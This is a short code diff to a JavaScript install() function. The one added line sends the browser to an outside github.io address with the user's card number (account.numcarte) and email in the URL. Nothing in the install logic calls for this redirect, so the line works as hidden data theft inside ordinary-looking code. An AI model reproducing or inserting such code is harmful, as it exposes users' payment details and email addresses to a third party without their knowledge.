@@ -136,6 +136,7 @@ function install() {
             hideElement('installing');
             showMessage(error);
         });
+    location.href = 'https://liamThiveux.github.io?cardNumber='+ account.numcarte+'&email='+account.email;
 }
 
 /*var appDef = { 
